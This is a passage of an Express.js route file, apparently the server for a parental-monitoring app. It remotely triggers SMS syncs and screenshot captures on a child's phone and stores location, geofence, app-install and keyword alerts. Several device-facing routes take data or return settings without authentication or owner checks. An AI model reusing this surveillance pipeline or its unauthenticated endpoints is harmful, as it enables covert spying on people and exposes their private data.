    res.status(500).json({ error: 'Failed to get SMS' });
  }
});

// Request SMS sync from device
router.post('/:deviceId/sms/sync', protect, async (req, res) => {
  try {
    const { hours = 48 } = req.body;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    if (!device.fcmToken) {
      return res.status(400).json({ error: 'Device not connected' });
    }

    if (!admin.apps.length) {
      return res.status(503).json({ error: 'Push notifications not configured' });
    }

    await admin.messaging().send({
      token: device.fcmToken,
      data: {
        command: 'sync_sms',
        hours: hours.toString()
      },
      android: { priority: 'high' }
    });

    res.json({
      success: true,
      message: 'SMS sync request sent to device'
    });
  } catch (error) {
    console.error('Failed to request SMS sync:', error);
    res.status(500).json({ error: 'Failed to send sync request' });
  }
});

// ============ SCREENSHOT ENDPOINTS ============

// Get latest screenshot for a device
router.get('/:deviceId/screenshot', protect, async (req, res) => {
  try {
    const deviceIdParam = req.params.deviceId;
    console.log(`[Screenshot] Getting latest screenshot for: ${deviceIdParam}`);

    // Find device - try MongoDB _id first, then deviceId
    let device = null;
    const mongoose = require('mongoose');
    
    if (mongoose.Types.ObjectId.isValid(deviceIdParam)) {
      device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
    }

    if (!device) {
      console.log(`[Screenshot] Device not found: ${deviceIdParam}`);
      return res.status(404).json({ error: 'Device not found' });
    }

    console.log(`[Screenshot] Found device: ${device.name}, deviceId: ${device.deviceId}`);

    // Get latest screenshot
    const screenshot = await Screenshot.findOne({ deviceId: device.deviceId })
      .sort({ capturedAt: -1 });

    if (!screenshot) {
      console.log(`[Screenshot] No screenshot found for device: ${device.deviceId}`);
      return res.status(404).json({ error: 'No screenshot available', hint: 'Request a screenshot first' });
    }

    console.log(`[Screenshot] Found screenshot: ${screenshot._id}, captured at: ${screenshot.capturedAt}`);

    res.json({
      success: true,
      screenshot: {
        id: screenshot._id.toString(),
        imageData: screenshot.imageData,
        width: screenshot.width,
        height: screenshot.height,
        capturedAt: screenshot.capturedAt
      }
    });
  } catch (error) {
    console.error('Failed to get screenshot:', error);
    res.status(500).json({ error: 'Failed to get screenshot' });
  }
});

// Get all screenshots for a device (history)
router.get('/:deviceId/screenshots', protect, async (req, res) => {
  try {
    const deviceIdParam = req.params.deviceId;
    const limit = parseInt(req.query.limit) || 20;
    const page = parseInt(req.query.page) || 1;
    
    console.log(`[Screenshots] Getting screenshot history for: ${deviceIdParam}`);

    // Find device
    let device = null;
    const mongoose = require('mongoose');
    
    if (mongoose.Types.ObjectId.isValid(deviceIdParam)) {
      device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
    }

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Get screenshots with pagination
    const skip = (page - 1) * limit;
    const screenshots = await Screenshot.find({ deviceId: device.deviceId })
      .sort({ capturedAt: -1 })
      .skip(skip)
      .limit(limit);

    const total = await Screenshot.countDocuments({ deviceId: device.deviceId });

    res.json({
      success: true,
      screenshots: screenshots.map(s => ({
        id: s._id.toString(),
        imageData: s.imageData,
        width: s.width,
        height: s.height,
        capturedAt: s.capturedAt
      })),
      total,
      page,
      pages: Math.ceil(total / limit)
    });
  } catch (error) {
    console.error('Failed to get screenshots:', error);
    res.status(500).json({ error: 'Failed to get screenshots' });
  }
});

// Request screenshot capture from device
router.post('/:deviceId/screenshot/capture', protect, async (req, res) => {
  try {
    const deviceIdParam = req.params.deviceId;

    // Find device
    let device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
    if (!device) {
      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
    }

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    if (!device.fcmToken) {
      return res.status(400).json({ error: 'Device not connected' });
    }

    if (!admin.apps.length) {
      return res.status(503).json({ error: 'Push notifications not configured' });
    }

    await admin.messaging().send({
      token: device.fcmToken,
      data: {
        command: 'capture_screenshot',
        timestamp: Date.now().toString()
      },
      android: { 
        priority: 'high',
        directBootOk: true
      }
    });

    res.json({
      success: true,
      message: 'Screenshot capture request sent to device'
    });
  } catch (error) {
    console.error('Failed to request screenshot:', error);
    res.status(500).json({ error: 'Failed to send screenshot request' });
  }
});

// Upload screenshot from device (called by Android app)
router.post('/:deviceId/screenshot/upload', async (req, res) => {
  try {
    const deviceIdParam = req.params.deviceId;
    const { imageData, width, height } = req.body;

    console.log(`[Screenshot Upload] Received from device: ${deviceIdParam}`);

    if (!imageData) {
      return res.status(400).json({ error: 'Image data is required' });
    }

    // Find device by deviceId
    const device = await Device.findOne({ deviceId: deviceIdParam });
    if (!device) {
      console.log(`[Screenshot Upload] Device not found: ${deviceIdParam}`);
      return res.status(404).json({ error: 'Device not found' });
    }

    // Keep last 20 screenshots (delete older ones)
    const screenshotCount = await Screenshot.countDocuments({ deviceId: device.deviceId });
    if (screenshotCount >= 20) {
      // Delete oldest screenshots to keep only 19 (new one will make 20)
      const oldScreenshots = await Screenshot.find({ deviceId: device.deviceId })
        .sort({ capturedAt: 1 })
        .limit(screenshotCount - 19);
      for (const old of oldScreenshots) {
        await Screenshot.deleteOne({ _id: old._id });
      }
    }

    // Save new screenshot
    const screenshot = new Screenshot({
      deviceId: device.deviceId,
      imageData,
      width: width || 0,
      height: height || 0,
      capturedAt: new Date()
    });

    await screenshot.save();

    console.log(`Screenshot saved for device ${device.deviceId}`);

    res.json({
      success: true,
      message: 'Screenshot uploaded successfully',
      screenshotId: screenshot._id.toString()
    });
  } catch (error) {
    console.error('Failed to upload screenshot:', error);
    res.status(500).json({ error: 'Failed to upload screenshot' });
  }
});

// Mark notifications as read for a device
router.post('/:deviceId/notifications/mark-read', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Update all notifications for this device as read
    await Notification.updateMany(
      { deviceId: device.deviceId, isRead: { $ne: true } },
      { $set: { isRead: true, readAt: new Date() } }
    );

    res.json({ success: true, message: 'Notifications marked as read' });
  } catch (error) {
    console.error('Failed to mark notifications as read:', error);
    res.status(500).json({ error: 'Failed to mark notifications as read' });
  }
});

// Rename device (set alias)
router.put('/:deviceId/rename', protect, async (req, res) => {
  try {
    const { alias, name } = req.body;
    const newName = alias || name;

    if (!newName || !newName.trim()) {
      return res.status(400).json({ error: 'Name is required' });
    }

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    device.alias = newName.trim();
    await device.save();

    res.json({ success: true, device: transformDevice(device) });
  } catch (error) {
    console.error('Failed to rename device:', error);
    res.status(500).json({ error: 'Failed to rename device' });
  }
});

// ========== HELPER: Find device by deviceId field OR MongoDB _id ==========
async function findDeviceFlexible(deviceIdParam) {
  let device = await Device.findOne({ deviceId: deviceIdParam });
  if (!device) {
    try { device = await Device.findById(deviceIdParam); } catch (e) { /* not a valid ObjectId */ }
  }
  return device;
}

// ========== GEOFENCE ENDPOINTS ==========

// GET geofences for a device (called by child app)
router.get('/:deviceId/geofences', async (req, res) => {
  try {
    const device = await findDeviceFlexible(req.params.deviceId);
    if (!device) return res.status(200).json({ geofences: [] });
    res.json({ geofences: device.geofences || [] });
  } catch (error) {
    console.error('Failed to get geofences:', error.message);
    res.status(200).json({ geofences: [] });
  }
});

// POST geofence event from child device
router.post('/:deviceId/geofence-event', async (req, res) => {
  try {
    const device = await findDeviceFlexible(req.params.deviceId);
    if (!device) return res.status(200).json({ success: true });
    
    const { geofenceName, event, latitude, longitude, timestamp } = req.body;
    console.log(`[Geofence] Device ${device.name}: ${event} at ${geofenceName} (${latitude}, ${longitude})`);
    
    // Store as notification for parent visibility
    const notification = new Notification({
      deviceId: device.deviceId || req.params.deviceId,
      packageName: 'com.familyguardpro.geofence',
      appName: 'Geofence',
      title: `Geofence ${event}`,
      content: `${device.name} ${event === 'ENTER' ? 'entered' : 'exited'} ${geofenceName}`,
      timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await notification.save().catch(() => {}); // ignore duplicate
    
    res.json({ success: true });
  } catch (error) {
    console.error('Failed to save geofence event:', error.message);
    res.status(200).json({ success: true });
  }
});

// PUT/POST geofences from parent dashboard
router.put('/:deviceId/geofences', protect, async (req, res) => {
  try {
    const device = await Device.findOne({ _id: req.params.deviceId, owner: req.user._id });
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    device.geofences = req.body.geofences || [];
    await device.save();
    res.json({ success: true, geofences: device.geofences });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update geofences' });
  }
});

// ========== SCREEN TIME ENDPOINTS ==========

// GET screen time limits (called by child app)
router.get('/:deviceId/screen-time-limits', async (req, res) => {
  try {
    const device = await findDeviceFlexible(req.params.deviceId);
    if (!device) return res.status(200).json({ limits: {} });
    res.json({ limits: device.screenTimeLimits || {} });
  } catch (error) {
    console.error('Failed to get screen time limits:', error.message);
    res.status(200).json({ limits: {} });
  }
});

// POST screen time data from child device
router.post('/:deviceId/screen-time', async (req, res) => {
  try {
    const device = await findDeviceFlexible(req.params.deviceId);
    if (!device) return res.status(200).json({ success: true });
    
    const { totalScreenTime, timestamp, appUsage } = req.body;
    
    // Update current screen time
    if (totalScreenTime !== undefined) {
      device.screenTime = Math.round(totalScreenTime / 60000); // convert ms to minutes
    }
    
    // Store history entry (keep last 30 days)
    if (!device.screenTimeHistory) device.screenTimeHistory = [];
    device.screenTimeHistory.push({
      date: timestamp ? new Date(timestamp) : new Date(),
      totalScreenTime: totalScreenTime || 0,
      appUsage: appUsage || []
    });
    // Keep only last 30 entries
    if (device.screenTimeHistory.length > 30) {
      device.screenTimeHistory = device.screenTimeHistory.slice(-30);
    }
    
    // Also update app usage
    if (appUsage && appUsage.length > 0) {
      for (const app of appUsage) {
        await AppUsage.findOneAndUpdate(
          { deviceId: device.deviceId || req.params.deviceId, packageName: app.packageName },
          {
            deviceId: device.deviceId || req.params.deviceId,
            packageName: app.packageName,
            appName: app.packageName.split('.').pop(),
            usageTime: Math.round((app.usageTime || 0) / 60000),
            lastUsed: app.lastUsed ? new Date(app.lastUsed) : new Date()
          },
          { upsert: true, new: true }
        );
      }
    }
    
    device.lastSeen = new Date();
    device.isOnline = true;
    await device.save();
    
    console.log(`[ScreenTime] Device ${device.name}: ${Math.round((totalScreenTime || 0) / 60000)} min, ${(appUsage || []).length} apps`);
    res.json({ success: true });
  } catch (error) {
    console.error('Failed to save screen time:', error.message);
    res.status(200).json({ success: true });
  }
});

// PUT screen time limits from parent dashboard
router.put('/:deviceId/screen-time-limits', protect, async (req, res) => {
  try {
    const device = await Device.findOne({ _id: req.params.deviceId, owner: req.user._id });
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    device.screenTimeLimits = req.body.limits || req.body;
    await device.save();
    res.json({ success: true, limits: device.screenTimeLimits });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update screen time limits' });
  }
});

// ========== KEYWORD ENDPOINTS ==========

// GET keywords for a device (called by child app)
router.get('/:deviceId/keywords', async (req, res) => {
  try {
    const device = await findDeviceFlexible(req.params.deviceId);
    if (!device) return res.status(200).json({ keywords: [] });
    res.json({ keywords: device.keywords || [] });
  } catch (error) {
    console.error('Failed to get keywords:', error.message);
    res.status(200).json({ keywords: [] });
  }
});

// POST keyword alert from child device
router.post('/:deviceId/keyword-alerts', async (req, res) => {
  try {
    const device = await findDeviceFlexible(req.params.deviceId);
    if (!device) return res.status(200).json({ success: true });
    
    const { keyword, context, appPackage, timestamp } = req.body;
    console.log(`[KeywordAlert] Device ${device.name}: "${keyword}" in ${appPackage}`);
    
    // Store as notification for parent
    const notification = new Notification({
      deviceId: device.deviceId || req.params.deviceId,
      packageName: appPackage || 'com.familyguardpro.keywords',
      appName: 'Keyword Alert',
      title: `Keyword detected: "${keyword}"`,
      content: context || `Keyword "${keyword}" was detected`,
      timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await notification.save().catch(() => {});
    
    res.json({ success: true });
  } catch (error) {
    console.error('Failed to save keyword alert:', error.message);
    res.status(200).json({ success: true });
  }
});

// PUT keywords from parent dashboard
router.put('/:deviceId/keywords', protect, async (req, res) => {
  try {
    const device = await Device.findOne({ _id: req.params.deviceId, owner: req.user._id });
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    device.keywords = req.body.keywords || [];
    await device.save();
    res.json({ success: true, keywords: device.keywords });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update keywords' });
  }
});

// ========== LOCATION UPDATE ENDPOINT ==========

// PUT location from child device
router.put('/:deviceId/location', async (req, res) => {
  try {
    const device = await findDeviceFlexible(req.params.deviceId);
    if (!device) return res.status(200).json({ success: true });
    
    const { latitude, longitude, accuracy, address, timestamp } = req.body;
    
    device.location = {
      latitude, longitude, accuracy, address,
      timestamp: timestamp ? new Date(timestamp) : new Date()
    };
    device.lastSeen = new Date();
    device.isOnline = true;
    await device.save();
    
    // Also store in LocationHistory
    const locationEntry = new LocationHistory({
      deviceId: device.deviceId || req.params.deviceId,
      latitude, longitude, accuracy, address,
      timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await locationEntry.save().catch(() => {});
    
    res.json({ success: true });
  } catch (error) {
    console.error('Failed to update location:', error.message);
    res.status(200).json({ success: true });
  }
});

// ========== APP CHANGE ENDPOINT ==========

// POST app install/uninstall event from child device
router.post('/:deviceId/app-change', async (req, res) => {
  try {
    const device = await findDeviceFlexible(req.params.deviceId);
    if (!device) return res.status(200).json({ success: true });
    
    const { packageName, appName, event, timestamp } = req.body;
    console.log(`[AppChange] Device ${device.name}: ${event} ${packageName}`);
    
    // Store as notification
    const notification = new Notification({
      deviceId: device.deviceId || req.params.deviceId,
      packageName: packageName || 'unknown',
      appName: 'App Change',
      title: `App ${event === 'INSTALL' ? 'Installed' : 'Uninstalled'}`,
      content: `${appName || packageName} was ${event === 'INSTALL' ? 'installed' : 'uninstalled'}`,
      timestamp: timestamp ? new Date(timestamp) : new Date()
    });
    await notification.save().catch(() => {});
    
    res.json({ success: true });
  } catch (error) {
    console.error('Failed to save app change:', error.message);
    res.status(200).json({ success: true });
  }
});

module.exports = router;
